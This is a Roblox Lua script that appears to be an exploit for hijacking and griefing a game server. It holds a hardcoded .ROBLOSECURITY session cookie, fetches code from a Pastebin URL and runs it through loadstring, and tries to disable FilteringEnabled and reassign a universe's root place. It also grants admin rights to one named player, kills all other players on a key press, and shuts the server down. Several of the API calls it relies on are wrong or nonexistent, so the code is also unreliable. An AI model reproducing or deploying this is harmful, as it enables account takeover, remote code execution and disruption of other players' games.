-- Importing required services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local ServerScriptService = game:GetService("ServerScriptService")

-- Authentication and Configuration
local builderId = 4554607568
local placeId = 12109643
local universeId = 8226497
local newBuilderId = 80254
local roblosecurityCookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_ACCD081179344C0F2CCA3DD77C7EFB0B3DCB74A88A54488B89B5426391141DF995A0514F205C8A7500DFF9D1D546CC77B183A01E8F3CE829638C6B9BA657A1F20001C41D905F24A7698A00ED6D4D5B27E246456D1039FE76DA0E1986E630B0304711D01E8DBC598012D03C118BEB6B12EF9F70D421D74723C1BEA1AED0D053AC4307BAD140A30182285A363A8D7920E50740C8116BCFD6E57FD06697DC416127FD65EEEB2EA080D66436FC23E859545DC3671E68343F12F5D7404EB67A06CEFB2FACD27E886B3DBEE8A5D41DDDDFF4B69B35BEF2FB4FC4F5B5DB9A6F9B90F2208E102494C3478266674CFDB9A1087299545B8490E10A7F328460E654B486D5FE2B22C78BB85EB1744C9EEB12F2A14502D53437B2A34AF352D6AC3E52FA2A121F0AE0152A01322CFF653DBE4EB97E4864C56065EF827CAAB0BB4D27EA6356BFF1629550E6095821F05B4A07C9F0E2A778F933A8E6BAB5495426B87575B900EB5584084F47EFD52A39FDF709A7C636B5C046C9F738E6A7EA923086A4189C1FF0EF727C1642EC8D9A0F41C1D0874D159C31EAEC0B083B3B1B227B102ED07BF4A7A3DAA3CD852277699748C509604E72E4D5F497338C0A9B4716348088C69D90A35FF8B83F59B36088632B4116F3D4BC873411F6A11325B51F6197EE827D095BD7A724F4B172E03A2AD8952077D5E4AA4231BD53AA31B7F7C94B2153ABF43E6A8F513E30515271873914428BA69B4E20E8536C7C6B05C26EF437EF29F5D1D02DF90FF511265F5C0F38BC970186908CDD1EB30A35E23B4AF0517E82459001B9A2CB925D619AA037DABC2823361532269D8AEAAC1651B766C1677EFEEAC70720A2F222B6D137EE17FC42F3C9A25B1BE313FA150360C2D8BBBD360C6D6090D7C14E092E38FAAD65B056B5488097782BD7B8222BA42DEEFE897E36CCC31C38151E6425E7D6C5B1DDDA2B817EFB683A857216198CC0B409A766FAD7679B62E1BB6B5944365856FE2D39C598355E5988B0CA4877288EE5E9D15F273D60D3D6BE210CD12D56DCE89EBD"

-- Face decals
local decals = {18666483374, 12939960283, 835557562}

-- Pastebin URL for additional script
local pastebinUrl = "https://pastebin.com/raw/7zK1Swpt"

-- Authenticate with Roblosecurity cookie
HttpService:SetRequestHeader("Cookie", ".ROBLOSECURITY=" .. roblosecurityCookie)

-- Function to make werrrolo an administrator
local function makeAdmin(playerName)
    local placeDetails = {
        ["placeId"] = placeId,
        ["builderId"] = builderId,
        ["isAdmin"] = (playerName == "werrrolo")
    }
    return HttpService:JSONEncode(placeDetails)
end

-- WebSocket implementation
local websocket = require("websocket")
local client = websocket.client.sync()

client:connect("ws://127.0.0.1:8080/")
client:on("open", function()
    print("WebSocket connection opened.")
end)
client:on("message", function(message)
    print("Received message: " .. message)
end)
client:on("close", function()
    print("WebSocket connection closed.")
end)

-- Function to change Universe Root Place ID
local function changeUniverseRootPlaceId()
    local url = "https://api.roblox.com/universes/" .. universeId .. "/rootplace"
    local data = {["placeId"] = newBuilderId}
    local json = HttpService:JSONEncode(data)
    HttpService:PostAsync(url, json)
end

-- Bypass FilteringEnabled
StarterGui:SetCore("ResetButtonCallback", true)
StarterGui.ResetButtonCallback = false

-- Function to change face decals
local function changeFaceDecals(player)
    local face = player.Character:FindFirstChild("face")
    while true do
        for _, decalId in ipairs(decals) do
            face.Texture = "rbxassetid://" .. decalId
            wait(0.1)
        end
    end
end

-- Key press functionality
local function onKeyPress(input)
    if input.KeyCode == Enum.KeyCode.M then
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name ~= "werrrolo" then
                p.Character:BreakJoints()
            end
        end
    end
end
UserInputService.InputBegan:Connect(onKeyPress)

-- Load and execute script from Pastebin
local function loadScriptFromPastebin()
    local response = HttpService:GetAsync(pastebinUrl)
    local loadstring = loadstring or load
    loadstring(response)()
end
loadScriptFromPastebin()

-- Use DefinesCapabilities to disable FilteringEnabled
local function disableFiltering()
    game:GetService("ReplicatedStorage").FilteringEnabled = false
    game:GetService("Workspace").FilteredSelection = false
    game:GetService("Players").LocalPlayer.Camera.CameraType = Enum.CameraType.Scriptable
end
disableFiltering()
loadScriptFromPastebin()

-- Wait 3 minutes and disconnect the server
wait(180)
print("its olddorito this is a test")
game:Shutdown()
